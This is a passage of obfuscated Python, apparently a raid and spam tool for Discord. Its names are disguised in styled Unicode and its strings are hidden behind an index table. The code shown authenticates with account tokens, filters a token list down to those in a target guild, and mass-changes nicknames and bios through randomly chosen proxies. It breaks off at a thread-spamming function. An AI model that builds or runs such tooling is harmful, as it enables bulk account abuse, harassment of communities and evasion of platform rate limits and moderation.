𝙄𝙉𝙄𝗡𝘭𝘭𝘐𝙈𝙄𝗜𝙡𝙈𝘭𝘭𝙄𝘭𝙡𝘕𝗡𝙄𝗹𝙡𝘔𝙉𝗹𝙉𝘭𝘔𝗜𝘔𝗜𝙈[278]: {𝙄𝘕𝗜𝙉𝙡𝙡𝘐𝘔𝘐𝙄𝘭𝗠𝘭𝙡𝘐𝙡𝘭𝘕𝗡𝗜𝘭𝗹𝗠𝗡𝗹𝙉𝘭𝘔𝘐𝙈𝘐𝘔[295]: {}, 𝗜𝗡𝘐𝙉𝘭𝗹𝙄𝗠𝗜𝙄𝘭𝙈𝘭𝙡𝘐𝗹𝙡𝘕𝗡𝘐𝘭𝗹𝙈𝙉𝗹𝙉𝙡𝗠𝘐𝙈𝗜𝘔[296]: 𝙄𝙉𝗜𝗡𝗹𝗹𝘐𝗠𝙄𝘐𝗹𝘔𝗹𝗹𝗜𝗹𝙡𝙉𝙉𝘐𝙡𝙡𝗠𝙉𝗹𝘕𝗹𝙈𝘐𝗠𝙄𝘔[231], 𝗜𝗡𝗜𝗡𝗹𝗹𝘐𝘔𝘐𝙄𝗹𝙈𝗹𝗹𝘐𝙡𝙡𝗡𝙉𝗜𝗹𝘭𝙈𝘕𝘭𝗡𝙡𝙈𝗜𝘔𝙄𝙈[297]: 0, 𝙄𝘕𝗜𝗡𝗹𝗹𝘐𝘔𝙄𝙄𝗹𝙈𝙡𝗹𝘐𝗹𝗹𝗡𝙉𝗜𝙡𝙡𝗠𝗡𝘭𝗡𝗹𝗠𝗜𝘔𝙄𝘔[298]: -1}}}
    𝘸𝘴.send(𝘫𝘴𝘰𝙣.dumps(𝗮𝙪𝙩𝘩))
    while True:
        𝙝𝙚𝙖𝗿𝘁𝙗𝘦𝗮𝘁𝘑𝘚𝙊𝘕 = {𝘐𝙉𝘐𝗡𝘭𝗹𝙄𝘔𝙄𝗜𝗹𝗠𝗹𝗹𝙄𝘭𝗹𝙉𝘕𝗜𝙡𝙡𝗠𝙉𝗹𝗡𝙡𝙈𝙄𝙈𝗜𝗠[169]: 1, 𝙄𝘕𝙄𝗡𝗹𝗹𝙄𝙈𝘐𝗜𝗹𝗠𝘭𝗹𝘐𝘭𝙡𝙉𝗡𝙄𝘭𝙡𝙈𝗡𝙡𝙉𝘭𝘔𝘐𝗠𝘐𝙈[253]: 𝙩𝗼𝘬𝙚𝙣, 𝘐𝙉𝙄𝙉𝗹𝗹𝗜𝙈𝗜𝙄𝗹𝙈𝗹𝘭𝗜𝗹𝗹𝘕𝗡𝗜𝙡𝘭𝙈𝗡𝙡𝘕𝗹𝙈𝘐𝘔𝘐𝙈[166]: 𝙄𝘕𝙄𝙉𝘭𝗹𝙄𝙈𝙄𝘐𝗹𝘔𝙡𝙡𝙄𝙡𝘭𝗡𝙉𝙄𝙡𝗹𝙈𝘕𝘭𝘕𝗹𝘔𝙄𝗠𝘐𝘔[290]}
        𝘄𝘴.send(𝙟𝘴𝘰𝙣.dumps(𝘩𝘦𝘢𝘳𝘁𝙗𝘦𝘢𝙩𝘑𝙎𝘖𝘕))
        𝘴𝘭𝗲𝙚𝘱(𝙝𝙚𝙖𝗿𝘵𝗯𝘦𝘢𝘵_𝙞𝘯𝙩𝘦𝗿𝘃𝙖𝙡)

def bio_changer(token, bio):
    𝘩𝙚𝘢𝘥𝘦𝗿𝘴 = 𝘏𝘦𝙖𝙙𝙚𝗿𝙨(𝘵𝗼𝘬𝙚𝗻)
    𝗽𝗮𝙮𝗹𝙤𝘢𝗱 = {𝘐𝘕𝗜𝗡𝗹𝘭𝘐𝘔𝙄𝗜𝙡𝘔𝘭𝗹𝙄𝗹𝗹𝗡𝗡𝙄𝗹𝘭𝘔𝗡𝘭𝘕𝗹𝗠𝘐𝙈𝘐𝘔[299]: 𝙗𝗶𝗼}
    𝘥𝙣 = 𝘵𝗼𝘬𝗲𝗻.split(𝙄𝘕𝘐𝗡𝘭𝙡𝘐𝗠𝘐𝘐𝗹𝗠𝗹𝗹𝙄𝗹𝗹𝗡𝗡𝙄𝙡𝙡𝙈𝘕𝘭𝘕𝘭𝙈𝘐𝙈𝘐𝗠[247])
    𝘯𝗻 = 𝙙𝗻[0]
    if 𝘱𝙧𝘰𝘅𝘺:
        𝙧𝗿 = 𝙧𝗲𝙦𝘂𝙚𝙨𝘵𝙨.patch(𝗜𝗡𝙄𝙉𝘭𝘭𝗜𝙈𝙄𝗜𝘭𝙈𝘭𝙡𝙄𝙡𝗹𝗡𝘕𝗜𝘭𝘭𝗠𝗡𝙡𝗡𝙡𝙈𝙄𝘔𝘐𝘔[300], headers=𝗵𝙚𝗮𝗱𝙚𝙧𝘀, json=𝗽𝘢𝘺𝘭𝗼𝘢𝙙, proxy={𝗜𝙉𝗜𝙉𝘭𝙡𝘐𝘔𝗜𝘐𝙡𝙈𝗹𝗹𝙄𝘭𝘭𝗡𝘕𝙄𝘭𝗹𝙈𝘕𝘭𝘕𝘭𝘔𝘐𝗠𝘐𝗠[244]: 𝗜𝙉𝙄𝙉𝘭𝗹𝗜𝙈𝗜𝘐𝘭𝙈𝙡𝗹𝘐𝗹𝘭𝘕𝙉𝗜𝘭𝙡𝙈𝗡𝘭𝘕𝗹𝘔𝙄𝗠𝘐𝙈[246] + 𝗿𝙖𝙣𝘥𝘰𝗺.choice(𝘱𝗿𝘰𝙭𝙞𝙚𝙨), 𝗜𝗡𝙄𝙉𝘭𝘭𝗜𝗠𝗜𝗜𝙡𝗠𝗹𝗹𝘐𝙡𝘭𝗡𝙉𝘐𝗹𝗹𝙈𝘕𝗹𝗡𝘭𝘔𝙄𝙈𝘐𝗠[245]: 𝘐𝙉𝘐𝘕𝘭𝘭𝘐𝙈𝘐𝗜𝗹𝗠𝘭𝗹𝗜𝗹𝙡𝗡𝙉𝗜𝘭𝘭𝘔𝙉𝙡𝘕𝗹𝗠𝗜𝙈𝘐𝙈[246] + 𝘳𝗮𝗻𝗱𝗼𝗺.choice(𝙥𝙧𝗼𝘅𝗶𝙚𝘀)})
    else:
        𝘳𝙧 = 𝗿𝙚𝙦𝘶𝗲𝘴𝘵𝘴.patch(𝘐𝗡𝙄𝙉𝗹𝗹𝘐𝗠𝗜𝗜𝗹𝗠𝙡𝗹𝗜𝙡𝘭𝗡𝘕𝘐𝙡𝗹𝘔𝘕𝘭𝘕𝘭𝗠𝙄𝘔𝗜𝘔[300], headers=𝗵𝗲𝙖𝗱𝘦𝘳𝙨, json=𝘱𝙖𝙮𝘭𝘰𝘢𝙙)
    if 𝘳𝘳.status_code == 200:
        𝙥𝙧𝗶𝙣𝘁(f"{𝙧}{𝘐𝙉𝗜𝗡𝘭𝗹𝙄𝗠𝗜𝙄𝘭𝘔𝘭𝙡𝗜𝘭𝘭𝗡𝘕𝘐𝙡𝗹𝗠𝘕𝙡𝗡𝘭𝗠𝘐𝗠𝗜𝙈[91]}{𝗱𝗮𝘵𝘦𝘵𝗶𝙢𝗲.datetime.now().strftime(f'{𝙜}{𝗜𝗡𝗜𝙉𝗹𝙡𝗜𝘔𝙄𝘐𝗹𝗠𝙡𝘭𝙄𝘭𝘭𝗡𝗡𝗜𝗹𝗹𝘔𝘕𝘭𝗡𝘭𝗠𝙄𝘔𝙄𝗠[92]}{𝘳}')}{𝗜𝗡𝗜𝙉𝗹𝙡𝘐𝗠𝙄𝘐𝗹𝘔𝙡𝘭𝗜𝗹𝙡𝙉𝗡𝙄𝙡𝘭𝙈𝗡𝗹𝗡𝗹𝘔𝘐𝗠𝘐𝗠[93]}{𝘳}{𝙄𝗡𝘐𝙉𝙡𝘭𝘐𝗠𝗜𝙄𝗹𝗠𝗹𝗹𝙄𝘭𝘭𝙉𝗡𝙄𝙡𝙡𝘔𝗡𝙡𝗡𝗹𝙈𝙄𝙈𝗜𝙈[91]}{𝗹𝗰}{𝗜𝗡𝗜𝙉𝘭𝗹𝗜𝘔𝘐𝙄𝙡𝘔𝘭𝗹𝗜𝗹𝙡𝗡𝗡𝘐𝗹𝗹𝗠𝗡𝘭𝘕𝘭𝙈𝘐𝘔𝗜𝘔[301]}{𝘳}{𝘐𝙉𝙄𝗡𝘭𝘭𝙄𝘔𝗜𝗜𝗹𝗠𝗹𝙡𝘐𝗹𝗹𝗡𝙉𝙄𝘭𝗹𝘔𝙉𝗹𝙉𝘭𝗠𝙄𝗠𝘐𝘔[93]}{𝘯𝘯}{𝘨}{𝘐𝗡𝗜𝗡𝙡𝗹𝗜𝘔𝘐𝙄𝘭𝗠𝙡𝗹𝗜𝘭𝘭𝗡𝙉𝗜𝗹𝘭𝙈𝗡𝘭𝗡𝘭𝗠𝙄𝗠𝗜𝗠[249]}")
    else:
        𝘱𝘳𝘪𝘯𝙩(f"{𝘳}{𝗜𝘕𝗜𝗡𝗹𝗹𝘐𝗠𝗜𝘐𝘭𝘔𝙡𝙡𝗜𝗹𝗹𝘕𝘕𝘐𝘭𝗹𝘔𝘕𝙡𝗡𝗹𝗠𝗜𝗠𝗜𝗠[91]}{𝗱𝘢𝘁𝗲𝘵𝗶𝗺𝘦.datetime.now().strftime(f'{𝗴}{𝗜𝘕𝘐𝙉𝘭𝗹𝘐𝗠𝙄𝙄𝙡𝘔𝙡𝗹𝗜𝙡𝗹𝙉𝘕𝗜𝗹𝙡𝙈𝘕𝘭𝗡𝙡𝙈𝘐𝗠𝗜𝘔[92]}{𝘳}')}{𝘐𝘕𝗜𝗡𝘭𝙡𝙄𝙈𝗜𝗜𝙡𝙈𝘭𝘭𝙄𝘭𝙡𝙉𝘕𝘐𝘭𝗹𝗠𝘕𝗹𝙉𝙡𝗠𝙄𝙈𝙄𝘔[93]}{𝗿}{𝗜𝘕𝗜𝙉𝗹𝙡𝘐𝙈𝙄𝘐𝗹𝘔𝗹𝗹𝗜𝗹𝘭𝗡𝘕𝗜𝙡𝙡𝙈𝙉𝙡𝗡𝗹𝘔𝙄𝘔𝘐𝗠[91]}{𝘣}{𝘐𝙉𝙄𝘕𝘭𝘭𝘐𝘔𝙄𝙄𝗹𝗠𝗹𝙡𝘐𝗹𝘭𝗡𝙉𝘐𝘭𝗹𝗠𝗡𝗹𝙉𝘭𝙈𝙄𝙈𝘐𝙈[269]}{𝗿}{𝗜𝙉𝙄𝘕𝘭𝗹𝙄𝗠𝘐𝙄𝘭𝙈𝘭𝗹𝗜𝗹𝘭𝙉𝗡𝗜𝗹𝗹𝗠𝙉𝘭𝘕𝘭𝙈𝘐𝘔𝘐𝙈[93]}{𝙣𝘯}{𝙜}{𝙄𝗡𝗜𝙉𝙡𝗹𝘐𝗠𝗜𝙄𝘭𝙈𝙡𝙡𝗜𝙡𝘭𝗡𝙉𝗜𝘭𝘭𝙈𝘕𝗹𝙉𝗹𝘔𝙄𝙈𝙄𝙈[270]}{𝗿𝙧.text}")

def check_guild(token, guildid):
    try:
        𝙝𝙚𝙖𝘥𝗲𝗿𝘴 = {𝘐𝗡𝘐𝙉𝗹𝘭𝗜𝙈𝘐𝗜𝗹𝙈𝗹𝘭𝗜𝗹𝗹𝘕𝗡𝙄𝙡𝗹𝙈𝙉𝘭𝘕𝘭𝗠𝗜𝘔𝘐𝘔[130]: 𝘵𝗼𝘬𝘦𝙣}
        if 𝙥𝙧𝗼𝘹𝙮:
            𝗿𝗲𝙨𝙥𝗼𝙣𝘀𝘦 = 𝗿𝗲𝘲𝘂𝗲𝘀𝙩𝘀.get(f'{𝙄𝙉𝙄𝘕𝘭𝗹𝙄𝘔𝘐𝘐𝘭𝘔𝘭𝗹𝗜𝙡𝗹𝗡𝗡𝗜𝙡𝙡𝗠𝘕𝘭𝙉𝘭𝘔𝗜𝗠𝗜𝙈[152]}{𝘨𝘶𝙞𝙡𝘥𝘪𝙙}', headers=𝘩𝙚𝗮𝘥𝗲𝙧𝙨, proxy={𝘐𝘕𝘐𝗡𝙡𝗹𝗜𝗠𝗜𝘐𝘭𝗠𝘭𝗹𝙄𝗹𝙡𝗡𝙉𝙄𝘭𝗹𝘔𝗡𝙡𝗡𝗹𝗠𝙄𝙈𝙄𝙈[244]: 𝗜𝗡𝘐𝙉𝙡𝗹𝙄𝘔𝘐𝙄𝗹𝗠𝘭𝘭𝗜𝗹𝗹𝙉𝗡𝙄𝙡𝘭𝘔𝗡𝘭𝗡𝗹𝗠𝙄𝙈𝗜𝙈[246] + 𝗿𝘢𝗻𝙙𝗼𝘮.choice(𝗽𝙧𝗼𝘅𝘪𝗲𝘴), 𝘐𝘕𝙄𝙉𝙡𝙡𝘐𝘔𝗜𝙄𝗹𝙈𝘭𝙡𝗜𝗹𝘭𝙉𝙉𝘐𝗹𝘭𝗠𝗡𝘭𝘕𝙡𝙈𝙄𝗠𝙄𝗠[245]: 𝙄𝙉𝗜𝘕𝗹𝘭𝗜𝙈𝙄𝘐𝙡𝙈𝙡𝗹𝘐𝙡𝙡𝗡𝙉𝘐𝙡𝗹𝙈𝘕𝘭𝙉𝘭𝙈𝘐𝘔𝙄𝙈[246] + 𝙧𝙖𝘯𝙙𝗼𝙢.choice(𝙥𝙧𝘰𝙭𝘪𝙚𝘀)})
        else:
            𝙧𝘦𝘴𝗽𝘰𝙣𝘀𝙚 = 𝗿𝙚𝗾𝘶𝘦𝙨𝙩𝘴.get(f'{𝘐𝙉𝙄𝗡𝗹𝘭𝗜𝗠𝙄𝗜𝙡𝘔𝗹𝘭𝙄𝙡𝗹𝘕𝘕𝗜𝗹𝘭𝘔𝘕𝘭𝙉𝘭𝘔𝙄𝗠𝗜𝗠[152]}{𝗴𝘶𝗶𝙡𝘥𝗶𝙙}', headers=𝘩𝘦𝘢𝙙𝗲𝗿𝘴)
        𝙙𝘯 = 𝙩𝙤𝗸𝗲𝗻.split(𝗜𝘕𝘐𝙉𝙡𝘭𝘐𝘔𝘐𝗜𝘭𝗠𝘭𝙡𝘐𝗹𝙡𝗡𝙉𝙄𝙡𝗹𝙈𝘕𝙡𝗡𝙡𝗠𝗜𝘔𝗜𝙈[247])
        𝙣𝘯 = 𝙙𝗻[0]
        if 𝘳𝙚𝙨𝘱𝗼𝘯𝙨𝙚.status_code == 200:
            𝗽𝗿𝙞𝗻𝙩(f"{𝗿}{𝙄𝙉𝘐𝙉𝘭𝘭𝘐𝗠𝘐𝗜𝗹𝙈𝙡𝙡𝗜𝙡𝗹𝘕𝘕𝘐𝗹𝘭𝙈𝙉𝙡𝗡𝘭𝙈𝘐𝘔𝗜𝗠[91]}{𝗱𝗮𝙩𝗲𝘵𝙞𝘮𝗲.datetime.now().strftime(f'{𝗴}{𝗜𝗡𝘐𝙉𝗹𝗹𝙄𝗠𝘐𝘐𝙡𝗠𝘭𝙡𝙄𝗹𝙡𝙉𝗡𝗜𝘭𝗹𝗠𝗡𝗹𝘕𝙡𝗠𝘐𝗠𝗜𝘔[92]}{𝙧}')}{𝘐𝗡𝘐𝗡𝘭𝙡𝙄𝘔𝙄𝘐𝗹𝘔𝘭𝘭𝙄𝘭𝗹𝘕𝘕𝘐𝙡𝘭𝗠𝘕𝗹𝙉𝘭𝙈𝙄𝗠𝙄𝘔[93]}{𝗿}{𝘐𝙉𝘐𝘕𝙡𝗹𝙄𝙈𝘐𝗜𝙡𝗠𝗹𝙡𝗜𝘭𝙡𝗡𝘕𝙄𝗹𝗹𝙈𝙉𝘭𝗡𝘭𝙈𝗜𝗠𝙄𝙈[91]}{𝙡𝙘}{𝘐𝙉𝗜𝘕𝗹𝗹𝘐𝘔𝙄𝗜𝘭𝙈𝗹𝙡𝙄𝗹𝘭𝘕𝘕𝗜𝙡𝙡𝘔𝘕𝗹𝙉𝗹𝙈𝘐𝘔𝙄𝗠[301]}{𝘳}{𝘐𝗡𝗜𝙉𝘭𝗹𝘐𝙈𝘐𝗜𝗹𝗠𝘭𝗹𝙄𝘭𝘭𝘕𝗡𝙄𝘭𝙡𝙈𝘕𝙡𝙉𝘭𝗠𝘐𝙈𝘐𝘔[93]}{𝙣𝘯}{𝙜}{𝘐𝙉𝙄𝙉𝗹𝘭𝗜𝗠𝙄𝗜𝙡𝙈𝙡𝘭𝗜𝘭𝗹𝗡𝙉𝙄𝘭𝘭𝘔𝗡𝙡𝘕𝗹𝘔𝙄𝙈𝘐𝘔[249]}")
            return True
        else:
            𝘱𝙧𝗶𝘯𝘵(f"{𝘳}{𝙄𝗡𝙄𝘕𝗹𝘭𝗜𝘔𝙄𝗜𝘭𝙈𝙡𝗹𝗜𝗹𝙡𝙉𝗡𝗜𝗹𝙡𝘔𝙉𝘭𝘕𝗹𝗠𝗜𝗠𝙄𝗠[91]}{𝘥𝗮𝘁𝙚𝘵𝘪𝙢𝘦.datetime.now().strftime(f'{𝗴}{𝘐𝘕𝗜𝘕𝙡𝙡𝙄𝘔𝘐𝘐𝗹𝗠𝙡𝗹𝙄𝙡𝙡𝙉𝙉𝗜𝘭𝘭𝙈𝗡𝙡𝘕𝗹𝘔𝗜𝘔𝗜𝙈[92]}{𝗿}')}{𝘐𝘕𝘐𝙉𝘭𝙡𝗜𝙈𝘐𝙄𝙡𝘔𝙡𝗹𝗜𝙡𝙡𝙉𝘕𝗜𝗹𝘭𝘔𝗡𝘭𝘕𝗹𝘔𝙄𝗠𝘐𝙈[93]}{𝙧}{𝘐𝙉𝘐𝗡𝗹𝙡𝘐𝗠𝗜𝘐𝘭𝙈𝗹𝘭𝙄𝘭𝙡𝗡𝗡𝗜𝘭𝙡𝗠𝘕𝘭𝘕𝗹𝙈𝙄𝙈𝗜𝘔[91]}{𝘣}{𝘐𝙉𝗜𝙉𝗹𝗹𝙄𝗠𝘐𝙄𝙡𝙈𝙡𝘭𝘐𝗹𝗹𝘕𝙉𝘐𝗹𝙡𝗠𝗡𝗹𝗡𝘭𝘔𝗜𝘔𝘐𝙈[302]}{𝙧}{𝗜𝗡𝙄𝘕𝙡𝘭𝗜𝙈𝙄𝙄𝘭𝙈𝗹𝗹𝗜𝘭𝙡𝙉𝘕𝗜𝗹𝗹𝘔𝘕𝘭𝘕𝗹𝙈𝘐𝘔𝗜𝙈[93]}{𝗻𝗻}{𝗴}{𝗜𝙉𝗜𝘕𝗹𝙡𝘐𝘔𝗜𝗜𝗹𝙈𝘭𝙡𝙄𝘭𝘭𝗡𝙉𝘐𝘭𝙡𝘔𝙉𝘭𝙉𝗹𝗠𝙄𝙈𝗜𝙈[249]}")
            return False
    except:
        pass

def save_tokens_guild(file_path, guildid):
    𝘃𝙖𝘭𝘪𝗱_𝙩𝘰𝘬𝘦𝗻𝙨 = 0
    𝘵𝘰𝗸𝗲𝘯𝘀_𝘃𝙖𝙡𝗶𝘥 = []
    𝘁𝙤𝘬𝘦𝙣𝙨 = 𝗼𝙥𝗲𝙣(𝗳𝗶𝙡𝗲_𝙥𝙖𝙩𝗵, 𝙄𝙉𝗜𝗡𝙡𝙡𝗜𝗠𝙄𝙄𝗹𝘔𝙡𝘭𝙄𝘭𝙡𝙉𝘕𝙄𝘭𝗹𝗠𝗡𝗹𝙉𝘭𝙈𝙄𝘔𝘐𝗠[30]).read().splitlines()
    for 𝙩𝘰𝘬𝗲𝗻 in 𝘵𝙤𝗸𝗲𝙣𝙨:
        if 𝙘𝙝𝗲𝘤𝗸_𝘨𝙪𝗶𝘭𝗱(𝘵𝗼𝘬𝙚𝘯, 𝘨𝙪𝙞𝗹𝗱𝘪𝘥):
            𝘃𝗮𝗹𝘪𝗱_𝙩𝙤𝘬𝗲𝗻𝘴 += 1
            𝘵𝙤𝙠𝘦𝙣𝘀_𝙫𝘢𝙡𝙞𝗱.append(𝘵𝙤𝙠𝙚𝘯)
    with 𝗼𝗽𝗲𝗻(𝘧𝘪𝙡𝗲_𝘱𝙖𝘁𝘩, 𝗜𝙉𝙄𝘕𝘭𝗹𝗜𝗠𝘐𝗜𝙡𝘔𝘭𝙡𝗜𝘭𝗹𝘕𝘕𝙄𝙡𝙡𝘔𝙉𝘭𝗡𝙡𝙈𝙄𝗠𝘐𝙈[213]) as 𝘧:
        𝗳.truncate(0)
    with 𝘰𝘱𝘦𝗻(𝘧𝘪𝗹𝙚_𝙥𝘢𝙩𝘩, 𝙄𝙉𝙄𝙉𝘭𝘭𝙄𝗠𝗜𝘐𝘭𝙈𝘭𝙡𝙄𝘭𝗹𝗡𝘕𝗜𝙡𝙡𝗠𝙉𝙡𝗡𝘭𝙈𝗜𝙈𝙄𝘔[215]) as 𝙛:
        for 𝘵𝗼𝙠𝗲𝘯 in 𝘵𝙤𝗸𝙚𝘯𝙨_𝘃𝙖𝘭𝗶𝘥:
            𝙛.write(𝘁𝘰𝘬𝙚𝘯 + 𝘐𝗡𝙄𝙉𝙡𝙡𝗜𝘔𝘐𝙄𝙡𝙈𝘭𝙡𝗜𝘭𝗹𝗡𝗡𝗜𝘭𝗹𝘔𝙉𝘭𝙉𝘭𝘔𝗜𝙈𝗜𝘔[63])

def mass_nick(token, guild, nick):
    𝗵𝙚𝗮𝘥𝘦𝘳𝘴 = 𝗛𝗲𝗮𝘥𝘦𝙧𝘴(𝙩𝙤𝗸𝙚𝙣)
    𝘱𝙖𝘺𝙡𝗼𝗮𝘥 = {𝗜𝙉𝗜𝙉𝙡𝗹𝗜𝘔𝗜𝗜𝙡𝗠𝘭𝗹𝗜𝗹𝙡𝘕𝗡𝙄𝗹𝙡𝙈𝗡𝘭𝗡𝗹𝙈𝙄𝗠𝘐𝙈[303]: 𝗻𝙞𝘤𝘬}
    𝙙𝙣 = 𝘵𝘰𝙠𝙚𝙣.split(𝙄𝙉𝗜𝘕𝙡𝘭𝙄𝗠𝙄𝙄𝘭𝗠𝙡𝗹𝗜𝘭𝙡𝙉𝗡𝗜𝗹𝘭𝘔𝗡𝙡𝗡𝙡𝙈𝗜𝘔𝙄𝘔[247])
    𝗻𝗻 = 𝙙𝗻[0]
    if 𝙥𝗿𝘰𝘅𝙮:
        𝗿𝘳 = 𝘳𝙚𝙦𝙪𝙚𝘀𝙩𝙨.patch(f'{𝗜𝗡𝗜𝙉𝘭𝙡𝘐𝗠𝗜𝙄𝘭𝗠𝗹𝙡𝗜𝘭𝘭𝙉𝘕𝙄𝗹𝗹𝙈𝘕𝘭𝙉𝗹𝗠𝘐𝘔𝙄𝘔[152]}{𝗴𝘂𝘪𝗹𝙙}{𝘐𝘕𝗜𝗡𝗹𝙡𝘐𝗠𝘐𝙄𝙡𝘔𝘭𝘭𝘐𝗹𝙡𝘕𝘕𝗜𝘭𝘭𝘔𝗡𝗹𝗡𝗹𝘔𝗜𝙈𝘐𝗠[304]}', json=𝗽𝘢𝘺𝘭𝘰𝗮𝙙, headers=𝙝𝘦𝘢𝙙𝙚𝘳𝘴, proxy={𝘐𝘕𝗜𝙉𝙡𝗹𝗜𝘔𝗜𝘐𝙡𝙈𝙡𝙡𝘐𝗹𝙡𝗡𝘕𝙄𝙡𝗹𝘔𝗡𝘭𝙉𝘭𝙈𝘐𝘔𝗜𝘔[244]: 𝗜𝙉𝙄𝘕𝙡𝘭𝙄𝙈𝗜𝗜𝗹𝘔𝘭𝗹𝘐𝗹𝘭𝙉𝙉𝘐𝗹𝘭𝗠𝙉𝗹𝙉𝙡𝘔𝗜𝗠𝘐𝗠[246] + 𝘳𝘢𝗻𝙙𝘰𝙢.choice(𝗽𝗿𝙤𝙭𝗶𝗲𝙨), 𝗜𝙉𝘐𝘕𝗹𝗹𝗜𝗠𝗜𝙄𝙡𝗠𝙡𝘭𝗜𝘭𝗹𝙉𝙉𝗜𝘭𝘭𝘔𝘕𝙡𝗡𝗹𝘔𝙄𝗠𝘐𝙈[245]: 𝗜𝗡𝙄𝙉𝘭𝙡𝘐𝙈𝗜𝘐𝙡𝗠𝗹𝙡𝘐𝙡𝙡𝙉𝘕𝗜𝙡𝙡𝙈𝘕𝙡𝙉𝙡𝗠𝗜𝘔𝘐𝘔[246] + 𝙧𝘢𝘯𝙙𝘰𝘮.choice(𝘱𝗿𝙤𝘹𝘪𝗲𝘴)})
    else:
        𝙧𝗿 = 𝗿𝙚𝗾𝘂𝗲𝘀𝘁𝙨.patch(f'{𝙄𝙉𝗜𝗡𝘭𝙡𝘐𝙈𝙄𝗜𝘭𝗠𝙡𝗹𝗜𝘭𝙡𝘕𝙉𝘐𝙡𝘭𝙈𝘕𝘭𝙉𝗹𝙈𝙄𝗠𝙄𝙈[152]}{𝗴𝘂𝗶𝙡𝙙}{𝙄𝙉𝘐𝗡𝘭𝗹𝙄𝘔𝗜𝗜𝗹𝗠𝘭𝙡𝗜𝙡𝘭𝙉𝗡𝘐𝙡𝘭𝗠𝗡𝘭𝘕𝘭𝙈𝘐𝘔𝘐𝗠[304]}', json=𝙥𝙖𝘺𝗹𝙤𝙖𝗱, headers=𝙝𝗲𝙖𝘥𝗲𝗿𝘀)
    if 𝗿𝗿.status_code == 200:
        𝙥𝘳𝗶𝘯𝙩(f"{𝗿}{𝘐𝙉𝗜𝙉𝘭𝙡𝗜𝗠𝗜𝙄𝙡𝘔𝗹𝙡𝙄𝗹𝘭𝘕𝘕𝙄𝙡𝗹𝙈𝙉𝙡𝗡𝗹𝗠𝗜𝙈𝗜𝙈[91]}{𝘥𝗮𝘵𝘦𝘁𝙞𝘮𝘦.datetime.now().strftime(f'{𝘨}{𝙄𝙉𝙄𝙉𝙡𝘭𝘐𝘔𝘐𝗜𝗹𝙈𝗹𝘭𝗜𝘭𝗹𝗡𝘕𝙄𝘭𝘭𝘔𝗡𝗹𝘕𝙡𝘔𝗜𝗠𝗜𝗠[92]}{𝙧}')}{𝘐𝙉𝙄𝙉𝘭𝗹𝗜𝘔𝗜𝙄𝗹𝘔𝘭𝘭𝙄𝘭𝘭𝘕𝘕𝙄𝙡𝘭𝙈𝘕𝗹𝘕𝗹𝘔𝙄𝗠𝘐𝙈[93]}{𝙧}{𝘐𝗡𝙄𝙉𝙡𝙡𝙄𝘔𝘐𝘐𝘭𝙈𝗹𝗹𝙄𝙡𝗹𝗡𝘕𝙄𝙡𝙡𝘔𝘕𝗹𝙉𝗹𝘔𝘐𝘔𝙄𝙈[91]}{𝘭𝙘}{𝘐𝗡𝘐𝘕𝙡𝙡𝘐𝘔𝘐𝙄𝘭𝗠𝗹𝙡𝘐𝗹𝘭𝙉𝙉𝙄𝗹𝘭𝙈𝗡𝗹𝘕𝗹𝗠𝗜𝘔𝙄𝗠[301]}{𝙧}{𝙄𝗡𝘐𝘕𝙡𝘭𝘐𝗠𝘐𝗜𝗹𝙈𝗹𝗹𝗜𝗹𝙡𝙉𝗡𝙄𝘭𝙡𝙈𝙉𝘭𝙉𝘭𝘔𝘐𝘔𝘐𝗠[93]}{𝘯𝙣}{𝙜}{𝙄𝗡𝙄𝘕𝙡𝗹𝘐𝗠𝗜𝙄𝙡𝙈𝗹𝗹𝘐𝗹𝗹𝗡𝘕𝗜𝘭𝗹𝙈𝘕𝙡𝙉𝙡𝗠𝘐𝗠𝗜𝘔[249]}")
    else:
        𝗽𝙧𝘪𝗻𝘁(f"{𝙧}{𝙄𝘕𝘐𝗡𝘭𝘭𝗜𝗠𝗜𝘐𝗹𝘔𝗹𝙡𝗜𝙡𝗹𝘕𝙉𝘐𝗹𝗹𝘔𝙉𝙡𝘕𝙡𝙈𝗜𝙈𝙄𝗠[91]}{𝘥𝙖𝘁𝗲𝙩𝗶𝘮𝙚.datetime.now().strftime(f'{𝗴}{𝙄𝘕𝘐𝘕𝗹𝗹𝗜𝗠𝙄𝙄𝗹𝗠𝗹𝘭𝗜𝙡𝙡𝘕𝘕𝘐𝘭𝗹𝗠𝙉𝘭𝘕𝗹𝗠𝙄𝘔𝘐𝙈[92]}{𝗿}')}{𝘐𝗡𝙄𝙉𝙡𝙡𝙄𝗠𝘐𝗜𝗹𝘔𝙡𝗹𝗜𝗹𝘭𝘕𝘕𝗜𝗹𝗹𝙈𝗡𝘭𝘕𝗹𝙈𝙄𝗠𝗜𝙈[93]}{𝙧}{𝙄𝙉𝘐𝗡𝙡𝘭𝘐𝗠𝘐𝙄𝙡𝗠𝗹𝘭𝙄𝙡𝗹𝙉𝙉𝘐𝘭𝘭𝙈𝘕𝘭𝘕𝗹𝙈𝗜𝘔𝘐𝘔[91]}{𝙗}{𝗜𝙉𝗜𝘕𝘭𝙡𝗜𝘔𝙄𝘐𝘭𝙈𝘭𝗹𝘐𝘭𝘭𝗡𝗡𝗜𝗹𝗹𝗠𝗡𝙡𝙉𝘭𝘔𝙄𝗠𝗜𝗠[269]}{𝘳}{𝘐𝘕𝘐𝘕𝗹𝘭𝗜𝗠𝘐𝙄𝙡𝘔𝘭𝘭𝙄𝙡𝗹𝘕𝗡𝗜𝙡𝙡𝗠𝙉𝙡𝙉𝙡𝙈𝘐𝙈𝗜𝙈[93]}{𝗻𝗻}{𝗴}{𝘐𝙉𝘐𝗡𝗹𝘭𝙄𝙈𝙄𝙄𝗹𝗠𝘭𝙡𝘐𝙡𝗹𝙉𝗡𝗜𝗹𝘭𝗠𝘕𝗹𝙉𝗹𝙈𝙄𝘔𝗜𝘔[270]}{𝘳𝗿.text}")

def thread_spammer(token, name, channel):
    𝙝𝗲𝗮𝗱𝗲𝘳𝘴 = 𝘏𝗲𝙖𝘥𝙚𝘳𝙨(𝘵𝘰𝘬𝙚𝙣)
